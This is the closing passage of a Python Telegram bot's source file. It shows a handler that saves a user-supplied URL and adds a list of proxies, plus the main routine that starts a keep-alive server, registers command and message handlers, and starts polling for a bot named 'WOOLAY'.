        menu_text = build_menu_text(mode, pm.get_count(), text.strip(), user_id)
        await update.message.reply_text("✅ <b>URL Saved!</b>", parse_mode=ParseMode.HTML)
        await update.message.reply_text(menu_text, parse_mode=ParseMode.HTML, reply_markup=main_keyboard())

    elif context.user_data.get("awaiting_proxy"):
        context.user_data["awaiting_proxy"] = False
        pm = get_proxy_manager()
        lines = text.strip().splitlines()
        added, invalid = pm.add_proxies(lines)
        await update.message.reply_text(
            f"🕷️ <b>Proxies Added</b>\n✅ Valid: <code>{added}</code>\n❌ Invalid: <code>{invalid}</code>\n📦 Total: <code>{pm.get_count()}</code>",
            parse_mode=ParseMode.HTML,
        )

# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════

async def post_init(application):
    show_banner()
    log(GREEN + "[Bot] Ready" + RESET)

def main():
    # Start keep-alive web server
    keep_alive()

    # Build bot
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

    log(GREEN + "[Bot] Starting WOOLAY..." + RESET)
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
